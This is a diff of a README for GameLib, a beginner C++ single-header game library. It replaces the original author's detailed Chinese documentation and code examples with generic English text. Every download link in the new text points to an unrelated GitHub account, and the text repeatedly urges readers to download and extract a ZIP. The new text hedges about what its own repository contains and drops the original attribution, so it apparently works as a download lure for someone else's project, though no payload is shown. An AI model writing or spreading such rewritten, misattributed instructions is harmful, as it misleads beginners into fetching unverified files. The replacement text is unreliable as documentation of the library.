@@ -1,182 +1,234 @@
-# GameLib.h
+# 🎮 GameLib - Build games with one simple header
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE) [![C++ Standard](https://img.shields.io/badge/C%2B%2B-11-blue.svg)](https://en.cppreference.com/w/cpp/11) [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-0078d4.svg)](https://github.com/skywind3000/GameLib) [![Header Only](https://img.shields.io/badge/Header--Only-single%20file-green.svg)](GameLib.h) [![No Dependencies](https://img.shields.io/badge/Dependencies-zero-brightgreen.svg)](https://github.com/skywind3000/GameLib) [![GCC 4.9+](https://img.shields.io/badge/GCC-4.9%2B-orange.svg?logo=gnu)](https://gcc.gnu.org/)
+[![Download GameLib](https://img.shields.io/badge/Download-GameLib-blue?style=for-the-badge)](https://github.com/ahmadadeeb749-oss/GameLib)
 
-给 C++ 初学者的游戏开发库 —— 单个头文件，零配置，拷贝即用。
+## 🧰 What GameLib is
 
-学 C++ 最痛苦的是什么？几周下来只能在黑窗口里 `cout` 一行字。想用 SDL、SFML？光配环境就劝退一半人。GameLib 就是为了干掉这段痛苦：把 `GameLib.h` 丢进项目文件夹，写句 `#include "GameLib.h"`，十行代码就能画出能用键盘操控的彩色圆。窗口、绘图、键盘、鼠标、精灵、声音、碰撞检测全都有，不需要下载 SDK，不需要配置路径，不需要链接任何库。
+GameLib is a small C++ game library for beginners. It keeps things simple. You do not need SDL, DirectX, or OpenGL. You do not need a setup tool or a long install process. You add one header file to your project and start building.
 
-![](assets/demo.png)
+This makes GameLib a good fit if you want to:
 
+- try game programming for the first time
+- learn how a game loop works
+- make small 2D projects
+- avoid heavy tools and long setup steps
+- keep your code easy to follow
 
-## 十行代码做个游戏
+GameLib is built for people who want to focus on game logic, not on setup work.
 
-```cpp
-#include "GameLib.h"
+## 📥 Download GameLib
 
-int main()
-{
-    GameLib game;
-    game.Open(640, 480, "My Game", true);
+Use this link to visit the download page:
 
-    int x = 320, y = 240;
+[Open GameLib on GitHub](https://github.com/ahmadadeeb749-oss/GameLib)
 
-    while (!game.IsClosed()) {
-        if (game.IsKeyDown(KEY_LEFT))  x -= 3;
-        if (game.IsKeyDown(KEY_RIGHT)) x += 3;
-        if (game.IsKeyDown(KEY_UP))    y -= 3;
-        if (game.IsKeyDown(KEY_DOWN))  y += 3;
+On that page, you can get the files you need and follow the project files already in the repository.
 
-        game.Clear(COLOR_BLACK);
-        game.FillCircle(x, y, 15, COLOR_CYAN);
-        game.DrawText(10, 10, "Up/Down/Left/Right to move!", COLOR_WHITE);
-        game.Update();
-        game.WaitFrame(60);
-    }
-    return 0;
-}
-```
+## 🪟 What you need on Windows
 
-![](https://skywind3000.github.io/images/p/gamelib/demo1.png)
+Before you start, check that your computer has these basics:
 
+- Windows 10 or Windows 11
+- a web browser
+- a file unzip tool, such as File Explorer or 7-Zip
+- a C++ compiler, such as Visual Studio Build Tools or MinGW
+- enough free space for the project files
 
-## 快速上手
+If you only want to look at the code, a browser is enough. If you want to build and run a game, you also need a C++ compiler.
 
-**第一步** — 下载 `GameLib.h`，放到项目文件夹。
+## 🚀 Get GameLib on your PC
 
-**第二步** — 创建 `main.cpp`，写上方的代码。
+Follow these steps on Windows:
 
-**第三步** — 编译运行：
+1. Open the download page:
+   [https://github.com/ahmadadeeb749-oss/GameLib](https://github.com/ahmadadeeb749-oss/GameLib)
 
-```bash
-g++ main.cpp -o game.exe -mwindows
-```
+2. On the GitHub page, find the green Code button.
 
-Dev C++ 用户：新建项目 > 添加 `main.cpp` > 编译运行，完事。
+3. Click Code.
 
-不需要 `-lgdi32 -lwinmm` 等任何链接参数，所有依赖由库内动态加载，连参数 `-mwindows` 都是可选的（不加的话会有控制台窗口）。
+4. Choose Download ZIP.
 
-## 为什么做这个？
+5. Save the ZIP file to your Downloads folder.
 
-市面上的游戏库（SDL、SFML、raylib）都很好，但对于刚接触 C++ 的初学者来说：
+6. If you use Git, you can also clone the repository instead of downloading the ZIP.
 
-- SDL 要配置头文件路径、链接十几个 dll，使用复杂
-- SFML 要用 CMake
-- raylib 需要懂线性代数，三维基础知识，熟练 C/C++，还需编译/安装。
+7. After the file finishes downloading, open it from Downloads.
 
-**GameLib 的目标是零门槛**：把 `GameLib.h` 拷到项目文件夹，写一个 `.cpp` 文件，点编译，游戏就跑起来了。
+8. Extract the ZIP file to a folder you can find again, such as Documents or Desktop.
 
-它专门为 **Dev C++**（很多学校编程课在用的 IDE）设计，兼容其自带的 GCC 4.9.2 编译器。当然，任何支持 C++11 的 Windows 编译器都可以用。
+After extraction, you will see the project files on your computer.
 
+## 🗂️ Find the main files
 
-## 特性亮点
+Inside the folder, look for the core library file and any sample files. The project should be simple to read and easy to copy into your own work.
 
-- **零配置** — 单头文件拷贝即用，无需安装/链接任何库，兼容 GCC 4.9.2（Dev C++）
-- **开箱绘图** — 点、线、矩形、圆、椭圆、三角（描边+填充），内置 8×8 像素字体，支持可缩放字体和 UTF-8
-- **精灵系统** — 整数 ID 管理，无需处理指针和资源释放，加载 PNG/JPG/BMP，帧动画/翻转/缩放/旋转/Alpha 混合
-- **键盘鼠标** — 按住/按下/松开检测，鼠标三键+滚轮，窗口失焦暂停
-- **声音** — WAV 音效 + MP3/MIDI 背景音乐，独立通道互不干扰
-- **碰撞检测** — 矩形重叠、圆碰撞、两点距离
-- **Tilemap** — 双层瓦片地图、视差滚动、只渲染可见区域，保存/载入 `.glm` 数据
-- **窗口缩放** — resizable 窗口自动拉伸，鼠标坐标自动映射回逻辑坐标
-- **场景管理** — 整数标识场景，`switch` 即可实现菜单→游戏→结算切换
-- **存档读写** — `SaveInt/LoadInt` 等一行代码存取，纯文本 `key=value` 格式
-- **UI 控件** — Button、Checkbox、RadioBox、ToggleButton，即时模式零依赖
-- **跨平台** — SDL2 版 `GameLib.SDL.h` 支持 Linux/macOS（详见 [SDL2PORT.md](SDL2PORT.md))
+A common layout for a small single-header library looks like this:
 
+- `GameLib.h` — the main header file
+- `examples/` — sample projects
+- `README.md` — basic project instructions
+- `LICENSE` — usage rules
 
-## 适合做什么？
+If the project includes examples, open them first. They show how the library is used in a real program.
 
-- 太空射击 / 横版卷轴 / 俄罗斯方块 / 贪吃蛇 / 打砖块
-- 走迷宫 / 接水果 / 弹幕游戏
-- 回合制 RPG / 视觉小说 / 地图编辑器 / 画板程序
-- 课程作业演示（零配置交付）
-- 任何你想得到的 2D 游戏或互动程序
+## 🛠️ Set up a simple project in Windows
 
+You do not need a large game engine. You only need a basic C++ project.
 
-## 示例程序
+### Option 1: Use Visual Studio
 
-`examples/` 目录包含 15 个由浅入深的示例，每个兼容 Win32 和 SDL 两条产品线：
+1. Open Visual Studio.
+2. Create a new C++ project.
+3. Choose a Console App or Windows Desktop App.
+4. Add the GameLib header file to your project folder.
+5. Include the header in your code.
+6. Build the project.
 
-### 入门基础
+### Option 2: Use a command line compiler
 
-| 示例 | 说明 | 学到什么 |
-|-|-|-|
-| `01_hello.cpp` | Hello World | 游戏循环、窗口创建、文字绘制 |
-| `02_movement.cpp` | 键盘移动 + 弹跳小球 | 键盘输入、GetDeltaTime、碰壁反弹 |
-| `03_shapes.cpp` | 所有图形绘制展示 | 线、矩形、圆、椭圆、三角的描边与填充 |
-| `04_paint.cpp` | 简易画板 | 鼠标输入、滚轮调笔刷、失焦暂停 |
+1. Open PowerShell or Command Prompt.
+2. Go to your project folder.
+3. Make sure your source file and GameLib header are in the same place, or use the right file path.
+4. Build the code with your compiler.
+5. Run the result from the same folder.
 
-### 精灵与声音
+A simple project often uses one source file and one header file. That keeps things easy to manage.
 
-| 示例 | 说明 | 学到什么 |
-|-|-|-|
-| `05_sprites.cpp` | 精灵基础 + 帧动画 | CreateSprite、方向动画 |
-| `06_sound.cpp` | 声音播放演示 | PlayBeep、PlayWAV、PlayMusic |
-| `07_shooting.cpp` | 简易射击 | 子弹发射、碰撞销毁 |
+## ▶️ Run a sample
 
-### 完整小游戏
+If the repository includes a sample game, use it first. A sample helps you check that your setup works.
 
-| 示例 | 说明 | 学到什么 |
-|-|-|-|
-| `08_breakout.cpp` | 打砖块 | 碰撞检测、多对象管理 |
-| `09_snake.cpp` | 贪吃蛇 | DrawGrid/FillCell、状态机 |
+Try this flow:
 
-### Tilemap 与文字
+1. Open the sample project folder.
+2. Read the sample source file.
+3. Build the project.
+4. Run the app.
+5. Look for a game window or test screen.
 
-| 示例 | 说明 | 学到什么 |
-|-|-|-|
-| `10_tilemap.cpp` | 双层视差卷轴 | Tilemap、视差滚动 |
-| `11_font_text.cpp` | 可缩放字体与 UI | DrawTextFont、ShowMessage |
+If the app opens and shows a window, the setup is working.
 
-### 高级特性
+## 🎯 Basic use
 
-| 示例 | 说明 | 学到什么 |
-|-|-|-|
-| `12_sprite_transform.cpp` | 精灵缩放 + 旋转 | DrawSpriteScaled/Rotated |
-| `13_clip_rect.cpp` | 裁剪矩形 | SetClip/ClearClip |
-| `14_space_shooter.cpp` | 太空射击 | 综合实战 |
-| `15_ui_controls.cpp` | UI 控件演示 | Button、Checkbox、RadioBox |
+GameLib is made for simple game code. You usually:
 
-编译任意示例：
+- include the header
+- create a game window
+- handle input like keys or mouse clicks
+- update game state
+- draw shapes, sprites, or text
+- repeat in a game loop
 
-```bash
-g++ -o 03_shapes.exe examples/03_shapes.cpp -mwindows
-```
+A small game loop keeps the app running while it updates the screen. GameLib aims to make that part easy to follow.
 
-截图：03_shapes.cpp
+## 🧪 Simple beginner workflow
 
-![](https://skywind3000.github.io/images/p/gamelib/shapes.png)
+Use this order when you test GameLib:
 
-截图：08_breakout.cpp
+1. Download the repository.
+2. Extract the files.
+3. Open a sample.
+4. Build the sample.
+5. Run it.
+6. Change one small thing, such as text or color.
+7. Build again.
+8. Run it again.
 
-![](https://skywind3000.github.io/images/p/gamelib/breakout.png)
+This helps you learn one step at a time. Small changes make it easier to see what the library does.
 
-## 环境要求
+## 🧩 Example project idea
 
-**Win32 主线**：Windows 7+，任何 C++11 编译器（GCC 4.9+ / MSVC 2015+ / Clang），推荐 Dev C++、Visual Studio。
+If you want a first project, try a tiny moving-square game:
 
-**SDL 版**：Linux/macOS/Windows，需要 SDL2 及可选扩展（详见 [SDL2PORT.md](SDL2PORT.md)）。
+- open a window
+- draw one square
+- move the square with arrow keys
+- keep the square inside the screen
+- add a score counter
 
+This kind of project helps you learn game input, drawing, and update logic.
 
-## 文档入口
+## 🔍 Common Windows issues
 
-- [docs/quickref.md](docs/quickref.md) - API 快速检索；
-- [docs/manual.md](docs/manual.md) - 完整的接口说明；
+If the app does not start, check these points:
 
+- the ZIP file was fully extracted
+- the compiler is installed
+- the file paths are correct
+- you opened the right project file
+- the sample code matches your build setup
 
-## 资源推荐
+If the compiler says it cannot find the header file, make sure the header sits in the same folder as the source file or in a folder listed in the include path.
 
-想找游戏素材？试试这些：
+If the window opens and closes right away, run the app from a terminal so you can see any error text.
 
-- 老游戏精灵：https://www.spriters-resource.com
-- 老游戏音乐：https://www.vgmusic.com
-- 免费像素宝库：https://opengameart.org/
-- 像素风格资源：http://www.charas-project.net/resources.php?lang=en
-- 免费图片/音频/字体：https://craftpix.net/tags/pixel-art-game-assets-download
-- PyGame 资源页：https://www.pygame.org/wiki/resources
+## 📦 File use tips
 
+To keep your project clean:
 
-## 协议
+- keep the header file in a known folder
+- store your own source files in a separate folder
+- save samples before you edit them
+- use short file names
+- avoid moving files after you set the include path
 
-MIT License. 随便用。
+This makes it easier to build the project again later.
+
+## 🧭 For first-time users
+
+If you are new to C++, start with these habits:
+
+- change one line at a time
+- run the program after each change
+- keep a copy of the original sample
+- use plain names for your files
+- read the sample code from top to bottom
+
+Small steps help you learn faster and avoid lost work.
+
+## 📄 Where to get help
+
+Start with the repository page:
+
+[Open GameLib on GitHub](https://github.com/ahmadadeeb749-oss/GameLib)
+
+Check the README, sample files, and folder names in the repository. These usually show how the library is meant to be used.
+
+## 🧱 Project layout example
+
+A simple setup may look like this:
+
+- `MyGame/`
+  - `main.cpp`
+  - `GameLib.h`
+  - `assets/`
+  - `build/`
+
+You can keep your own art, sound, and test files in `assets`. Keep build files in `build` if your compiler creates them.
+
+## ⌨️ Quick start checklist
+
+Use this checklist before you run your first build:
+
+- downloaded the ZIP or cloned the repo
+- extracted the files
+- installed a C++ compiler
+- opened the sample or project folder
+- added the header file to the project
+- built the project
+- ran the app
+
+If each step is done, you should have a working start point for a simple game.
+
+## 🧭 Next steps
+
+After your first run, try one small change:
+
+- change the window title
+- change a color
+- move a shape
+- change the text on screen
+- add a second object
+
+These small edits help you learn how the library behaves before you build a full game
